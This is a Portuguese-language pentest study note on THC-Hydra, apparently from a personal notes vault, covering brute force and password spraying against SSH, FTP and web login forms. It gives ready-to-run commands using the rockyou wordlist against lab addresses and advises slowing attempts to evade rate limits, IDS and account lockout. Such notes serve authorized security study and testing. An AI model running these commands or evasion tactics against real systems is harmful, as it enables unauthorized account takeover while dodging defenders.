O `hydra` (THC-Hydra) é uma ferramenta de [[7. Brute Force]] online contra serviços de login em rede. Ele tenta pares de usuário e senha de uma [[7. Wordlist]] contra um serviço ativo ([[5. SSH]], FTP, [[5. SMB]], RDP, MySQL, formulário web, etc) até acertar uma credencial válida.

Por ser um ataque [[7. Brute Force#Online x offline|online]], o `hydra` bate direto no serviço do alvo. Isso significa que ele sofre com a latência da rede, aparece nos logs e pode acionar bloqueio de conta. Para quebrar hashes que você já capturou, o ataque é offline com o [[11. john]].

# Uso

```shell
$ hydra [options] <target> <service>
$ hydra [options] <service>://<target> # forma alternativa
```

Parâmetros de credencial:

- `-l [user]`: um único usuário.
- `-L [arquivo]`: wordlist de usuários (um por linha).
- `-p [senha]`: uma única senha.
- `-P [arquivo]`: wordlist de senhas.
- `-M [arquivo]`: lista de alvos (um host por linha, aceita `host:porta`), para atacar vários de uma vez.

Use `-l` ou `-L` (não os dois juntos), e `-p` ou `-P`. Outros parâmetros úteis:

- `-s [port]`: porta, quando o serviço não está na padrão.
- `-t [n]`: tarefas paralelas por alvo (padrão 16). É o principal controle de velocidade: menos tarefas deixa o ataque mais lento e discreto, mais tarefas acelera, mas aumenta o barulho e a chance de lockout.
- `-W [sec]`: tempo de espera entre uma tentativa e a próxima na mesma thread (padrão 0). Serve para desacelerar de propósito e escapar de rate limit ou de detecção por volume.
- `-w [sec]`: tempo máximo de espera pela resposta do serviço (padrão 32). Não confunda com o `-W` maiúsculo.
- `-f`: para no primeiro acerto daquele host (`-F` para parar em todos os alvos quando usar `-M`).
- `-V`: mostra cada tentativa de login e senha.
- `-o [file]`: salva as credenciais encontradas.

## Um usuário, wordlist de senhas

```shell
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5
# -l admin: usuário fixo
# -P ...:   testa cada senha da wordlist contra esse usuário
```

## Wordlist de usuários com uma senha (spraying)

```shell
$ hydra -L users.txt -p 'Verao@2024' ftp://10.10.10.5
# -L users.txt:  testa cada usuário do arquivo
# -p 'Verao@2024': todos com a mesma senha, para evitar lockout no mesmo login
```

## Wordlist de usuários x wordlist de senhas

```shell
$ hydra -L users.txt -P rockyou.txt -V ssh://10.10.10.5
# cada usuário é testado contra cada senha (produto das duas listas)
# -V: acompanha as tentativas na tela
```

## Vários alvos de uma vez

```shell
$ hydra -L users.txt -P pass.txt -M targets.txt -F ssh
# -M targets.txt: um host por linha (ex 10.10.10.5 ou 10.10.10.5:2222)
# -F: para tudo assim que achar a primeira credencial entre os alvos
# o serviço (ssh) vai como último argumento
```

## Ataque devagar (evasão)

```shell
$ hydra -l admin -P rockyou.txt -t 1 -W 5 ssh://10.10.10.5
# -t 1:  uma tentativa por vez, sem paralelismo
# -W 5:  espera 5 segundos entre cada tentativa
# ritmo baixo para não estourar rate limit nem disparar alerta por volume
```

## Formulário web (http-post-form)

```shell
$ hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=inválido"
# ^USER^ e ^PASS^: onde o hydra injeta o usuário e a senha
# F=inválido:      string que aparece na resposta quando a senha está errada
```

> [!redteam] Low and slow para evadir detecção
> Sistemas de segurança (WAF, IDS, rate limit, política de lockout) reagem ao volume de tentativas em pouco tempo. Baixar o paralelismo com `-t 1` e adicionar espera entre tentativas com `-W` deixa o ataque muito mais lento, mas passa bem mais fácil por esses controles.

> [!warning] Barulho e bloqueio de conta
> Mesmo devagar, ataque online gera logins falhos que enchem os logs e podem travar a conta do alvo.
